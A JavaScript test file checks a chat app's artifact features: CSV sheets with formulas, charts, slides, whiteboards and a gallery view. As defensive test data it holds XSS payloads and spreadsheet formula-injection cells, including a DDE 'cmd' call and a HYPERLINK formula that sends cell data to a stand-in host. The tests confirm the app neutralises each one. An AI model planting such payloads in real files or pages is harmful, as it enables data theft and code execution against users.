// Artifacts in the window: what a reply made (nova-rich.js), the kinds the app draws itself (nova-kinds.js) and the
// gallery (nova-gallery.js). Stand-in pages only: no browser, no screen, nothing sent.
const { test } = require('node:test'), assert = require('node:assert/strict'), vm = require('node:vm'), fs = require('node:fs'), path = require('node:path');
const read = name => fs.readFileSync(path.join(__dirname, '../jcc/static', name), 'utf8');
const EVIL = '<img src=x onerror=alert(1)>', SCRIPT = '"><script>alert(2)</script>';
const same = (a, b, why) => assert.equal(JSON.stringify(a), JSON.stringify(b), why);        // (values made in another context compare by what they hold)

function kinds() {
  const context = { NovaIcon: () => '', NovaNoteLink: n => n, console };
  context.globalThis = context; vm.createContext(context);
  vm.runInContext(read('nova-rich.js'), context); vm.runInContext(read('nova-kinds.js'), context);
  return context;
}
const { NovaRich, NovaKinds: K } = kinds();

test('the window reads a reply as the library does', () => {
  // The same examples are read by the library in tests/test_artifacts.py: the two must agree on every one.
  const cases = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/artifacts.json'), 'utf8'));
  assert.ok(cases.length > 25);
  const plain = s => s.replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
  for (const c of cases) {
    const html = NovaRich.rich(c.text);
    const got = [...html.matchAll(/class="nv-artifact" data-kind="([^"]*)" data-name="([^"]*)".*?<small>[^<]*? · (\d+) lines?<\/small>/g)].map(m => ({ kind: m[1], name: plain(m[2]), lines: Number(m[3]) }));
    same(got, c.made, c.why);
  }
});

test('the new kinds have a name and an icon on their card', () => {
  const html = NovaRich.rich('```slides\n# Deck\n\none\n\n---\n\ntwo\n```\n\n```csv\na,b\n1,2\n3,4\n```\n\n```chart\n{\n"title": "Sales",\n"series": []\n}\n```');
  same([...html.matchAll(/data-kind="(\w+)" data-name="([^"]*)"/g)].map(m => [m[1], m[2]]), [['slides', 'Deck'], ['sheet', 'Sheet'], ['data', 'Sales']]);
  assert.match(html, /<small>Slides · 7 lines<\/small>/); assert.match(html, /<small>Sheet · 3 lines<\/small>/); assert.match(html, /<small>Chart · 4 lines<\/small>/);
  assert.match(NovaRich.rich('```chart\n{"title": "One line", "series": []}\n```'), /<small>Chart · 1 line<\/small>/, 'one line is "1 line"');
  assert.ok(!/nv-artifact/.test(NovaRich.rich('```json\n{"title": "Sales", "series": []}\n```')), 'ordinary JSON stays an ordinary block');
  same(Object.keys(NovaRich.KIND_NAMES).filter(k => !NovaRich.KIND_ICONS[k]), [], 'every kind has an icon');
});

test('a sheet: text in, text out, with commas, quotes and formulas kept whole', () => {
  const text = 'Day,Loaves,Note\nMon,40,"said ""fresh"", twice"\n"Tue, late",55,\nSum,=SUM(B2:B3),=IF(B4>90,"busy","quiet")\nRound,"=ROUND(B4/7, 2)",';
  const grid = K.parseCsv(text);
  same(grid[1], ['Mon', '40', 'said "fresh", twice']); same(grid[2], ['Tue, late', '55', '']);
  same(grid[3], ['Sum', '=SUM(B2:B3)', '=IF(B4>90,"busy","quiet")'], 'a formula written without quotes keeps the commas inside its brackets');
  same(K.parseCsv(K.toCsv(grid)), grid, 'what is saved reads back the same');
  same(K.parseCsv('a,b\r\n1,2\r\n'), [['a', 'b'], ['1', '2']]);
  same(K.parseCsv(''), []);
  assert.equal(K.toCsv([['a', '', ''], ['', '', ''], ['', '', '']]), 'a', 'empty cells at the end and empty rows at the bottom are not written');
  assert.equal(K.parseCsv('x\n'.repeat(5000)).length, 2000, 'no more rows than can be shown');
});

test('a sheet: what its formulas come to', () => {
  const shown = text => K.compute(K.parseCsv(text)).map(row => row.map(K.shownValue));
  same(shown('Item,Price,Count,Total\nBread,4.5,40,=B2*C2\nCake,"1,200",2,=B3*C3\nAll,,=SUM(C2:C3),=SUM(D2:D3)\nMean,=AVERAGE(B2:B3),=MIN(C2:C3),=MAX(D2:D3)'),
    [['Item', 'Price', 'Count', 'Total'], ['Bread', '4.5', '40', '180'], ['Cake', '1,200', '2', '2,400'], ['All', '', '42', '2,580'], ['Mean', '602.25', '2', '2,400']]);
  same(shown('=37000/3,=10/3,=1/3,=2/3*100')[0], ['12,333.33', '3.3333', '0.333333', '66.6667'], 'a long tail of decimals is not shown');
  same(shown('=1+2*3,=(1+2)*3,=2^10,=-(3+4)*2,=10/4,=ROUND(10/3,2),=ABS(-7),=COUNT(A1:C1)')[0], ['7', '9', '1,024', '-14', '2.5', '3.33', '7', '3']);
  same(shown('5,=IF(A1>3,"big","small"),=IF(A1<3,"big"),=A1=5,=A1<>5,="a"="A"')[0], ['5', 'big', '', 'TRUE', 'FALSE', 'TRUE']);
  same(shown('=B1,=A1,=1/0,=NOPE(1),=1+,=A1:B2,=Z99+1,text,=D2+1')[0], ['#CYCLE', '#CYCLE', '#DIV/0', '#NAME', '#ERR', '#ERR', '1', 'text', '#VALUE'].map((v, i) => (i === 8 ? '1' : v)));
  same(shown('50%,=A1*200,$12,=C1+1')[0], ['0.5', '100', '12', '13'], 'a percentage and a price are numbers');
  same(shown('=SUM(A2:A4)\n1\nx\n3')[0], ['4'], 'words in a range are passed over');
  assert.equal(K.colName(0) + K.colName(25) + K.colName(26) + K.colName(701) + K.colName(702), 'AZAAZZAAA');
});

test('a formula is worked out, never run', () => {
  const shown = text => K.compute(K.parseCsv(text))[0].map(K.shownValue);
  for (const bad of ['=alert(1)', '=constructor.constructor("return 1")()', '=this', '=1;2', '=`x`', '=a.b', '=[1]', '={}', '=window', '=SUM(A1:ZZZ99999)']) {
    const got = shown('"' + bad.replace(/"/g, '""') + '"')[0];
    assert.match(got, /^#(ERR|NAME|CYCLE|VALUE)$/, bad + ' gave ' + got);
  }
  const deep = '=' + '('.repeat(3000) + '1' + ')'.repeat(3000);
  assert.match(shown(deep)[0], /^(1|#ERR)$/, 'very deep brackets do not bring the page down');
});

test('a sheet saved as a file leaves a spreadsheet program nothing to run but what this app understands', () => {
  // What was wrong: the file was the sheet's text as it stood. A cell such as =HYPERLINK(...), =cmd|'...'!A0 or a
  // link to a file on another computer (written into a sheet from a web page or an email a reply had read) was run by
  // the spreadsheet program the file was opened in.
  const cell = text => '"' + text.replace(/"/g, '""') + '"', line = cells => cells.map(cell).join(',');
  const RUNS = ['=HYPERLINK("http://example.invalid/?"&B2,"click")', "=cmd|' /C calc'!A0", "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0",
    "='\\\\example.invalid\\share\\[book.xlsx]Sheet1'!A1", '=WEBSERVICE("http://example.invalid")', '=IMPORTXML(A1,"//a")', ' =1+1', '\t=1+1', '=SUM(A1)+EXEC("calc")', '=A1&B1', '+HYPERLINK("x")'];
  const STAYS = ['Flour', '40', '-5', '+5', '-5%', '-$3', '+1 (555) 0100', '- none', '-- none --', '@handle', '+1+2', '', 'a=b', '1-2'];
  const KEPT = ['=SUM(B2:B3)', '=AVG(B2:B3)', '=ROUND(B2/3,2)', '=IF(B2>1,"busy","quiet")', '=-B2', '=(B2+B3)*2^2', '=IF(B2>1,"=HYPERLINK(1)","x")'];
  for (const bad of RUNS) {
    const made = K.exportCsv(line(['x', bad])), back = K.parseCsv(made.text)[0][1];
    assert.equal(back, "'" + bad, 'made plain text: ' + bad); assert.equal(made.changed, 1, bad);
    assert.ok(!/^\s*[=+\-@]/.test(back), 'a spreadsheet program is given nothing to run: ' + back);
  }
  for (const fine of [...STAYS, ...KEPT]) {
    const made = K.exportCsv(line(['x', fine, 'y']));
    assert.equal(K.parseCsv(made.text)[0][1] ?? '', fine, 'left exactly as it is: ' + fine); assert.equal(made.changed, 0, fine);
  }
  // With values only, no formula is left at all, and a value that would itself be run is made plain text.
  const sheet = 'Item,Cost\nFlour,40\nSalt,-5\nTotal,=SUM(B2:B3)\nThird,=ROUND(B4/3,2)\nBusy,"=IF(B4>1,""=HYPERLINK(1)"",""x"")"\nBad,=HYPERLINK(1)\nOk,=B2>1';
  const values = K.exportCsv(sheet, true), rows = K.parseCsv(values.text);
  same(rows.map(r => r[1]), ['Cost', '40', '-5', '35', '11.67', "'=HYPERLINK(1)", '#NAME', 'TRUE']);
  assert.equal(values.changed, 1);
  assert.ok(rows.every(r => r.every(c => !/^\s*=/.test(c))), 'no formula is left');
  // What the sheet shows is what the file says: the same numbers, worked out here.
  const shown = K.compute(K.parseCsv(sheet));
  assert.equal(String(shown[3][1]), rows[3][1]); assert.equal(String(shown[4][1]), rows[4][1]);
  // As written, the file reads back into the same sheet (nothing harmless is touched).
  const plain = 'Day,Loaves,Note\nMon,40,"said ""fresh"", twice"\n"Tue, late",55,\nSum,=SUM(B2:B3),"=IF(B4>90,""busy"",""quiet"")"';
  same(K.parseCsv(K.exportCsv(plain).text), K.parseCsv(plain));
  same(K.exportCsv(''), { text: '', changed: 0 }); same(K.exportCsv(null, true), { text: '', changed: 0 });
});

test('a chart: what is read from its JSON, and what is refused', () => {
  const chart = K.readChart(JSON.stringify({ type: 'line', title: EVIL, x: ['a', 2, { no: 1 }], unit: 'kg', series: [{ name: 7, values: [1, '2.5', 'x', null, Infinity] }, 'junk', { values: [3] }] }));
  same([chart.type, chart.title, chart.x, chart.unit], ['line', EVIL, ['a', '2', '', '4', '5'], 'kg']);
  same(chart.series, [{ name: '7', values: [1, 2.5, null, null, null] }, { name: 'Series 2', values: [3] }]);
  assert.equal(K.readChart(JSON.stringify({ type: 'evil', series: [{ values: [1] }] })).type, 'bar', 'an unknown type is drawn as bars');
  for (const bad of ['not json', '[]', '"text"', '{}', '{"series": []}', '{"series": [{"values": ["x"]}]}']) assert.ok(K.readChart(bad).problem, bad);
  assert.equal(K.readChart(JSON.stringify({ x: Array(900).fill('x'), series: Array(40).fill({ values: Array(900).fill(1) }) })).series.length, 12, 'no more than can be told apart');
  same(K.ticks(0, 55), [0, 10, 20, 30, 40, 50, 60]); same(K.ticks(-3, 7.2), [-4, -2, 0, 2, 4, 6, 8]); same(K.ticks(5, 5), [5, 5.2, 5.4, 5.6, 5.8, 6]);
});

test('slides: a line of dashes starts the next one, except inside code', () => {
  same(K.splitSlides('# One\n\nfirst\n\n---\n\n## Two\n```\n---\n```\n\n-----\n\n\n---\nThree'), ['# One\n\nfirst', '## Two\n```\n---\n```', 'Three']);
  same(K.splitSlides(''), []); same(K.splitSlides('only one'), ['only one']);
  assert.equal(K.splitSlides(Array(900).fill('x').join('\n---\n')).length, 300);
});

test('a whiteboard: only what a board can hold is taken from its text', () => {
  const board = K.readBoard(JSON.stringify({ w: 99999, items: [{ t: 'pen', c: 'red', s: 999, p: [1, 2, 'x', 4] }, { t: 'pen', p: [1] }, { t: 'text', text: EVIL, x: 99999, y: -99999, z: 5000 }, { t: 'text', text: '' },
    { t: 'note', c: '#ABCDEF', text: 5 }, { t: 'rect', x1: 1, y1: 2, x2: 3, y2: 4, c: 'javascript:alert(1)' }, { t: 'evil', run: 'x' }, null, 'junk'] }));
  same([board.w, board.h, board.items.length], [1600, 1000, 4]);
  same(board.items[0], { t: 'pen', c: '#1f1f24', s: 40, p: [1, 2, 0, 4] });
  same(board.items[1], { t: 'text', c: '#1f1f24', z: 120, x: 1800, y: -200, text: EVIL });
  same([board.items[2].c, board.items[2].text, board.items[3].c], ['#ABCDEF', '', '#1f1f24']);
  same(K.readBoard('not json').items, []); same(K.readBoard('[]').items, []);
  assert.equal(K.readBoard(JSON.stringify({ items: Array(9000).fill({ t: 'pen', p: [1, 2] }) })).items.length, 4000);
});

test('a page of its own carries words as words', () => {
  const html = K.page(EVIL + '</title><script>x</script>', '<p>ok</p>');
  assert.ok(!/<title>[^<]*<img/.test(html) && !/<\/title><script>x/.test(html)); assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;&lt;\/title&gt;/);
  const sheet = K.KINDS.sheet.page('Name,Total\n' + EVIL + ',=1+1\n"' + SCRIPT.replace(/"/g, '""') + '",x', 'Sales');
  assert.ok(!/<img|<script/i.test(sheet), sheet.slice(0, 300)); assert.match(sheet, /<td class="num">2<\/td>/); assert.match(sheet, /&lt;img src=x/);
  const deck = K.KINDS.slides.page('# ' + EVIL + '\n\n---\n\n' + SCRIPT, 'Deck');
  assert.ok(!/<img|<script>alert/i.test(deck)); assert.match(deck, /1 \/ 2/); assert.match(deck, /<section class="title">/);
  assert.match(K.documentPage('# Hello\n\n' + EVIL, 'Doc'), /<h2>Hello<\/h2><p>&lt;img/);
  for (const kind of ['slides', 'sheet', 'data', 'whiteboard']) assert.ok(K.KINDS[kind].blank('New').length > 10, kind);
  assert.ok(!K.readChart(K.KINDS.data.blank('New')).problem); same(K.readBoard(K.KINDS.whiteboard.blank()).items, []);
});

/* ---------------- the gallery, with a stand-in page ---------------- */
class Node {
  constructor(html = '') {
    this.dataset = {}; this.kids = new Map(); this.handlers = {}; this.html = html; this.value = ''; this.scrollTop = 9; this.isConnected = true; this.textContent = ''; this.className = ''; this.classes = new Set(['hidden']);
    this.classList = { contains: c => this.classes.has(c), add: c => this.classes.add(c), remove: c => this.classes.delete(c), toggle: (c, on) => { const want = on === undefined ? !this.classes.has(c) : on; if (want) this.classes.add(c); else this.classes.delete(c); return want; } };
  }
  set innerHTML(v) { this.html = String(v); } get innerHTML() { return this.html; }
  querySelector(sel) { if (!this.kids.has(sel)) this.kids.set(sel, new Node()); return this.kids.get(sel); }
  querySelectorAll() { return []; }
  addEventListener(name, fn) { (this.handlers[name] ||= []).push(fn); }
  append() {} after() {} focus() { this.focused = true; } setAttribute() {} close() { this.closed = true; } click() { this.clicked = true; }
}
function gallery(answers) {
  const calls = [], said = [], opened = [], made = [], kept = {}, nodes = {};
  const byId = id => (nodes[id] ||= new Node());
  const document = { querySelector: sel => (nodes[sel] ||= new Node()), getElementById: byId, body: new Node() };
  let view = null;
  const Nova = { icon: name => '<svg data-i="' + name + '"></svg>', el: (tag, attrs, html) => { const n = new Node(html); if (attrs && attrs.id === 'nv-gallery') view = n; return n; }, notify: t => said.push(t), confirmBox: async () => true, ask: async () => 'A new name',
                 store: { get: (k, d) => (k in kept ? kept[k] : d), set: (k, v) => { kept[k] = v; } }, openPop: () => {}, item: () => {}, dialog: () => new Node(), setDraft: t => said.push('draft: ' + t), newChat: () => opened.push('new chat'),
                 openArtifact: async id => { opened.push('artifact:' + id); }, newArtifact: async (kind, title) => { made.push([kind, title]); }, closePanel: () => {} };
  const esc = v => String(v ?? '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
  const api = async (address, body) => { calls.push([address, body]); const answer = answers[body.action]; return typeof answer === 'function' ? answer(body) : answer; };
  const context = { window: { Nova, openChat: async id => { opened.push('chat:' + id); } }, document, api, esc, toast: t => said.push('toast: ' + t), setTimeout: () => 0, clearTimeout: () => {}, addEventListener: () => {}, innerWidth: 1400, Date, console };
  context.window.IntersectionObserver = undefined; context.openChat = context.window.openChat;
  vm.createContext(context); vm.runInContext(read('nova-gallery.js'), context);
  const click = async button => { for (const fn of view.handlers.click) await fn({ target: { closest: sel => (sel === 'button' ? button : null) } }); await new Promise(setImmediate); };
  return { Nova, view, calls, said, opened, made, kept, click, list: () => view.querySelector('#nv-gal-list'), context };
}
const ROWS = [{ id: 'art-1', title: EVIL, kind: 'page', lang: 'html', updated: 5, chat: 'c1', starred: true, versions: '<b>3</b>', yours: false, size: 10, peek: SCRIPT },
              { id: 'art-2"' + SCRIPT, title: 'Board', kind: 'whiteboard' + SCRIPT, lang: 'whiteboard', updated: 6, chat: '', starred: false, versions: 1, yours: true, size: 10, peek: 'notes' }];

test('the gallery: six things to start, and what is listed stays words', async () => {
  const g = gallery({ list: { items: ROWS, more: false, kinds: { page: 'Page' + EVIL, whiteboard: 'Whiteboard' } } });
  same([...g.view.html.matchAll(/data-make="(\w+)"[^>]*>.*?<b>(\w+)<\/b>/g)].map(m => [m[1], m[2]]), [['document', 'Docs'], ['slides', 'Slides'], ['sheet', 'Sheets'], ['design', 'Design'], ['data', 'Data'], ['whiteboard', 'Whiteboard']]);
  same([...g.view.html.matchAll(/data-only="(\w*)">(\w+)</g)].map(m => [m[1], m[2]]), [['', 'All'], ['yours', 'Yours'], ['starred', 'Starred']]);
  g.Nova.openGallery(); await new Promise(setImmediate);
  same(g.calls[0], ['/api/artifacts', { action: 'list', query: '', kind: '', only: '' }]);
  const html = g.list().innerHTML;
  assert.ok(!/<img|<script/i.test(html), html.slice(0, 400)); assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/);
  assert.ok(!/versions/.test(html), 'a count that is not a number is not shown at all'); assert.match(html, /aria-label="Starred"/);
  assert.equal((html.match(/class="nv-gal-card"/g) || []).length, 2); assert.equal(g.list().className, 'nv-gal-grid');
  assert.ok(!g.view.classes.has('hidden')); assert.ok(g.context.document.body.classes.has('nv-gallery-on'));
  g.Nova.closeGallery(); assert.ok(g.view.classes.has('hidden')); assert.ok(!g.context.document.body.classes.has('nv-gallery-on'));
});

test('the gallery: tabs, one kind, cards or a list, and opening one', async () => {
  const g = gallery({ list: { items: ROWS, more: false, kinds: {} } });
  g.Nova.openGallery(); await new Promise(setImmediate);
  await g.click({ dataset: { only: 'starred' } });
  same(g.calls[g.calls.length - 1][1], { action: 'list', query: '', kind: '', only: 'starred' });
  await g.click({ dataset: { do: 'view' } });
  assert.equal(g.list().className, 'nv-gal-rows'); assert.equal(g.kept['nv-gal-view'], 'list');
  await g.click({ dataset: { open: 'art-1' } });
  same(g.opened, ['artifact:art-1']);
  await g.click({ dataset: { make: 'whiteboard' } });
  assert.equal(g.made.length, 1); assert.equal(g.made[0][0], 'whiteboard'); assert.match(g.made[0][1], /^Whiteboard, /);
});

test('the gallery: nothing yet, and nothing that matches', async () => {
  const g = gallery({ list: { items: [], more: false, kinds: {} } });
  g.Nova.openGallery(); await new Promise(setImmediate);
  assert.match(g.list().innerHTML, /Nothing has been made yet/); assert.ok(!/data-clear/.test(g.list().innerHTML));
  await g.click({ dataset: { only: 'yours' } });
  assert.match(g.list().innerHTML, /Nothing here matches/); assert.match(g.list().innerHTML, /data-clear/);
  await g.click({ dataset: { clear: '' } });
  same(g.calls[g.calls.length - 1][1], { action: 'list', query: '', kind: '', only: '' });
});
